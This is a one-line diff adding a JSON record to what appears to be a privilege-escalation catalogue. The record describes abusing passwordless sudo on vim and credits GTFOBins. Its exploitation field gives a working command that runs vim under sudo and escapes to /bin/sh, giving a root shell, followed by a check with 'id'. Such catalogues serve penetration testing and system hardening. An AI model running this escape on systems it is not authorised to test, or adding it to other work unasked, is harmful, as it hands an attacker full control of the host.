@@ -1,0 +1,1 @@
+{"id":"sudo_vim","category":"SUDO_NOPASSWD_CUSTOM","binary":"vim","cve":null,"exploitation":["sudo {{binary}} -c ':!/bin/sh'"],"post_exploit":["id"],"notes":"Interactive.","source":"gtfobins.github.io","tags":["sudo","nopasswd","gtfobins","interactive"],"severity":"high"}
